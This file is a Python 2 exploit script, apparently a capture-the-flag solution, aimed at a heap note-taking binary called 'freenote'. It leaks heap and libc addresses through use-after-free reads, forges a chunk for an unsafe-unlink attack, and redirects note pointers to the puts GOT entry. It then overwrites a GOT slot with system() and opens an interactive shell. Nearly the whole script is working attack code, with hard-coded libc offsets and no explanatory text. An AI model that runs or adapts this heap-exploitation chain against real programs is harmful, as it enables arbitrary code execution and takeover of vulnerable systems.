from zio import *
target  = './freenote'
io      = zio(target, print_read = False, print_write = False, timeout = 10000)

def list_note():
    io.read_until('Your choice:')
    io.writeline('1')

def new_note(payload):
    io.read_until('Your choice:')
    io.writeline('2')
    io.read_until('Length of new note:')
    io.writeline(str(len(payload)))
    io.read_until('Enter your note:')
    io.writeline(payload)

def edit_note(idx, payload):
    io.read_until('Your choice:')
    io.writeline('3')
    io.read_until('Note number:')
    io.writeline(str(idx))
    io.read_until('Length of note:')
    io.writeline(str(len(payload)))
    io.read_until('Enter your note:')
    io.writeline(payload)

def del_note(idx):
    io.read_until('Your choice:')
    io.writeline('4')
    io.read_until('Note number:')
    io.writeline(str(idx))

new_note('A' * 0x80)
new_note('A' * 0x80)
new_note('A' * 0x80)
new_note('A' * 0x80)
del_note(0)
del_note(2)
new_note('B' * 0x8)
list_note()
io.read_until('B' * 0x8)

heap_base   = l64(io.read_line()[0:-1].ljust(0x8, '\x00')) - 0x1940
print '[+] heap base : {}'.format(hex(heap_base))

del_note(0)
del_note(1)
del_note(3)

new_note('A' * 0x80)
new_note('B' * 0x80)
new_note('C' * 0x80)
del_note(0)
del_note(1)

payload  = l64(0x80)
payload += l64(0x80)
payload += l64(heap_base + 0x30 - 0x8*3)
payload += l64(heap_base + 0x30 - 0x8*2)
payload  = payload.ljust(0x80, 'A')
payload += l64(0x80)
payload += l64(0x90)

new_note(payload)
del_note(1)

got_puts  = 0x602020

payload  = l64(0x1)
payload += l64(0x1)
payload += l64(0x90)
payload += l64(got_puts)
payload  = payload.ljust(0x90)

edit_note(0x0, payload)
list_note()
io.read_until('0. ')

adr_puts    = l64(io.read_line()[0:-1].ljust(0x8, '\x00'))
off_puts    = 0x000000000006fe30
libc_base   = adr_puts - off_puts
off_system  = 0x0000000000046640
adr_system  = libc_base + off_system
off_read    = 0x00000000000eb800
adr_read    = libc_base + off_read

print '[+] libc base : {}'.format(hex(libc_base))

payload  = l64(adr_puts)
payload += 'A' * 8
payload += l64(adr_puts)
payload += 'A' * 8
payload += l64(adr_read)
payload  = payload.ljust(0x50, 'A')
payload += l64(adr_system)
payload  = payload.ljust(0x88, 'A')
payload += l64(heap_base + 0x10)

edit_note(0x0, payload)
io.writeline('sh')

io.interact()
